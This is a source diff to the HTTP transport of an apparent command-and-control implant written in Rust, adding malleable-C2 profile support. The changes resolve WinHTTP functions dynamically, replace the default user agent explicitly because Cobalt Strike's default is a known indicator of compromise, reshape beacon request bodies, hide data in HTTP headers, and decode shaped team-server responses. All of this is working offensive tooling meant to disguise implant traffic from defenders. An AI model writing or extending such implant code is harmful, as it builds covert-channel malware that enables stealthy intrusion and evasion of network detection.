@@ -44,6 +44,10 @@ struct WinhttpFns {
     read_data: FReadData,
     close_handle: FClose,
     query_data: FQueryData,
+    /// Optional: WinHttpAddRequestHeaders — only needed when the profile's
+    /// client block declares static headers or a header-terminator (data rides
+    /// in a header instead of the body). None ⇒ headers silently skipped.
+    add_request_headers: Option<FAddReqHeaders>,
 }
 
 type HINTERNET = *mut c_void;
@@ -58,6 +62,10 @@ type FRecvResp = unsafe extern "system" fn(HINTERNET, *const c_void) -> i32;
 type FReadData = unsafe extern "system" fn(HINTERNET, *mut u8, u32, *mut u32) -> i32;
 type FClose = unsafe extern "system" fn(HINTERNET) -> i32;
 type FQueryData = unsafe extern "system" fn(HINTERNET, *mut u32) -> i32;
+/// WinHttpAddRequestHeaders(hRequest, pwszHeaders, dwHeadersLength, dwModifiers) -> BOOL.
+/// Adds (or replaces) HTTP request headers. Used for the profile's client-block
+/// static headers and for a header-terminator (transformed bytes in a header).
+type FAddReqHeaders = unsafe extern "system" fn(HINTERNET, *const u16, u32, u32) -> i32;
 
 static mut WINHTTP: Option<WinhttpFns> = None;
 
@@ -98,6 +106,8 @@ unsafe fn ensure_winhttp() {
     let d = export_addr(b"winhttp.dll", b"WinHttpReadData");
     let cl = export_addr(b"winhttp.dll", b"WinHttpCloseHandle");
     let q = export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable");
+    // Optional: WinHttpAddRequestHeaders (client-block headers / header terminator).
+    let arh = export_addr(b"winhttp.dll", b"WinHttpAddRequestHeaders");
     if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q)) =
         (o, c, r, s, v, d, cl, q)
     {
@@ -115,6 +125,10 @@ unsafe fn ensure_winhttp() {
             read_data: core::mem::transmute(d),
             close_handle: core::mem::transmute(cl),
             query_data: core::mem::transmute(q),
+            add_request_headers: match arh {
+                Some(a) => Some(core::mem::transmute(a)),
+                None => None,
+            },
         });
         DONE.store(true, Ordering::Release);
     }
@@ -144,7 +158,15 @@ pub unsafe fn post_frame(
 ) -> Option<Vec<u8>> {
     ensure_winhttp();
     let fns = WINHTTP.as_ref()?;
-    let ua = to_utf16(b"Mozilla/5.0");
+    // User-agent: the profile's `set useragent` (baked at build) overrides the
+    // transport default. CS's default beacon UA is a well-known IOC, so a real
+    // engagement sets one in the profile.
+    let ua_bytes: &[u8] = if crate::envelopes::POST_CLIENT_UA.is_empty() {
+        b"Mozilla/5.0"
+    } else {
+        crate::envelopes::POST_CLIENT_UA
+    };
+    let ua = to_utf16(ua_bytes);
     // WinHttpOpen: WINHTTP_ACCESS_TYPE_DEFAULT_PROXY=0, flags=0.
     let session = (fns.open)(ua.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0);
     if session.is_null() {
@@ -206,14 +228,61 @@ pub unsafe fn post_frame(
         // TLS still works for valid-CA certs; only self-signed would fail at
         // handshake, and that surfaces as a normal retry, not a silent stall.
     }
-    // WinHttpSendRequest: no extra headers; body in optional section.
+    // Apply the profile's http-post CLIENT envelope to the request body (the
+    // malleable-C2 request direction). With no profile the baked steps are empty
+    // and `encode` is the identity, so `wire_body` == `body` (a fresh clone).
+    let csteps = crate::envelopes::post_client_steps();
+    let cterm = crate::envelopes::post_client_terminator();
+    let cheaders = crate::envelopes::post_client_headers();
+    let shaped = nyx_profile::encode(&csteps, body);
+    // Where do the transformed bytes go? Print/UriAppend/None → the body (the
+    // common case). Header(name) → the named header, body empty (the http-get
+    // metadata-in-Cookie pattern — though the implant only POSTs, so http-post
+    // client.output rarely uses it). Parameter rides in a URL query the implant
+    // doesn't build, so fall back to the body (decode still sees the data).
+    let (wire_body, data_header): (Vec<u8>, Option<(Vec<u8>, Vec<u8>)>) = match &cterm {
+        Some(nyx_profile::Terminator::Header(name)) => {
+            (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
+        }
+        _ => (shaped, None),
+    };
+
+    // Collect static client-block headers + (if header-terminator) the data
+    // header into one WinHttpAddRequestHeaders call (each "Name: Value\r\n").
+    if let Some(add_req_headers) = fns.add_request_headers {
+        let mut hdr: Vec<u8> = Vec::new();
+        for &(n, v) in cheaders.iter() {
+            hdr.extend_from_slice(n);
+            hdr.extend_from_slice(b": ");
+            hdr.extend_from_slice(v);
+            hdr.extend_from_slice(b"\r\n");
+        }
+        if let Some((n, v)) = &data_header {
+            hdr.extend_from_slice(n);
+            hdr.extend_from_slice(b": ");
+            hdr.extend_from_slice(v);
+            hdr.extend_from_slice(b"\r\n");
+        }
+        if !hdr.is_empty() {
+            let hdr16 = to_utf16(&hdr);
+            // dwHeadersLength = explicit char count (EXCLUDING the null terminator
+            // to_utf16 appends) — NOT -1. A -1 null-terminated read would truncate
+            // the header mid-value if a transform ever emitted an embedded NUL.
+            let hdr_len = (hdr16.len() - 1) as u32;
+            // dwModifiers = WINHTTP_ADDREQ_FLAG_ADD_OR_REPLACE (0x80000000).
+            let _ = add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000);
+        }
+    }
+
+    // WinHttpSendRequest: optional-section headers omitted (added above);
+    // body is the envelope-shaped bytes (or empty for a header-terminator).
     let ok = (fns.send_request)(
         req,
         core::ptr::null(),
         0,
-        body.as_ptr(),
-        body.len() as u32,
-        body.len() as u32,
+        wire_body.as_ptr(),
+        wire_body.len() as u32,
+        wire_body.len() as u32,
         0,
     );
     if ok == 0 {
@@ -252,6 +321,17 @@ pub unsafe fn post_frame(
         }
         let n = (read as usize).min(capped);
         out.extend_from_slice(&chunk[..n]);
+    }
+    // Invert the http-post SERVER envelope (the response direction). The team
+    // server applied `shape_beacon_response` (print/none/uri-append → bytes in
+    // the body; header → a response header the implant doesn't read yet). With
+    // no profile the steps are empty and this is a no-op. On decode failure keep
+    // the raw bytes so the frame parse fails loudly instead of silently dropping.
+    let ssteps = crate::envelopes::post_server_steps();
+    if !ssteps.is_empty() {
+        if let Ok(decoded) = nyx_profile::decode(&ssteps, &out) {
+            out = decoded;
+        }
     }
     (fns.close_handle)(req);
     (fns.close_handle)(conn);
